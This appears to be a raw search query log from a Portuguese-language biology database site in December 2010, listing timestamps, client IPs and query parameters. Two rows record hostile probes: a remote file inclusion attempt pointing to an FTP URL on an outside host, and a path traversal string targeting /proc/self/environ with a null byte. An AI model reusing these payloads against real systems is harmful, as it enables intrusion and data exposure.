date;ip;lang;col;site;query;index;where;filter;from
2010-12-23 00:10:38;190.107.36.93;pt;local;bio;*;*;BHLB;db:BHLB;3
2010-12-23 00:11:16;190.107.36.93;pt;local;bio;*;*;BHLB;db:BHLB;4
2010-12-23 00:12:53;190.107.36.93;pt;local;bio;*;*;BHLB;db:BHLB;5
2010-12-23 00:13:15;190.107.36.93;pt;local;bio;*;*;BHLB;db:BHLB;6
2010-12-23 00:13:33;190.107.36.93;pt;local;bio;*;*;BHLB;db:BHLB;7
2010-12-23 00:34:43;66.249.71.52;pt;local;bio;*;*;SCIB;db:SCIB;1
2010-12-23 01:22:01;187.41.19.113;pt;local;bio;crossodactylus;*;*;;1
2010-12-23 01:27:39;66.249.71.52;pt;local;bio;*;*;SCIB;db:SCIB;1
2010-12-23 01:28:32;66.249.71.52;pt;local;bio;Sua seleção;*;*;;1
2010-12-23 01:36:16;189.71.109.30;pt;local;ftp://smadesign.com.br:2409@smadesign.com.br/f.txt?;*;*;*;;1
2010-12-23 01:45:08;66.249.71.52;pt;local;bio;Sua seleção;*;*;;1
2010-12-23 02:19:48;66.249.71.52;pt;local;bio;Sua seleção;*;*;;1
2010-12-23 02:39:33;66.249.71.52;pt;local;bio;Sua seleção;*;*;;1
2010-12-23 03:17:15;66.249.71.52;pt;local;bio;Sua seleção;*;*;;1
2010-12-23 03:18:25;66.249.71.52;pt;local;bio;Sua seleção;*;*;;1
2010-12-23 03:20:10;66.249.71.52;pt;local;bio;*;*;SCIB;db:SCIB;1
2010-12-23 03:23:21;66.249.71.52;pt;local;bio;Sua seleção;*;*;;1
2010-12-23 03:35:31;66.249.71.52;pt;local;bio;*;*;*;;1
2010-12-23 03:46:37;66.249.71.52;pt;local;bio;Sua seleção;*;*;;1
2010-12-23 03:51:52;189.71.109.30;pt;local;../../../../../../../../../../../../../../../../proc/self/environ\0;*;*;*;;1
2010-12-23 03:52:38;66.249.71.52;pt;local;bio;Sua seleção;*;*;;1
2010-12-23 04:02:17;66.249.71.52;pt;local;bio;Sua seleção;*;*;;1
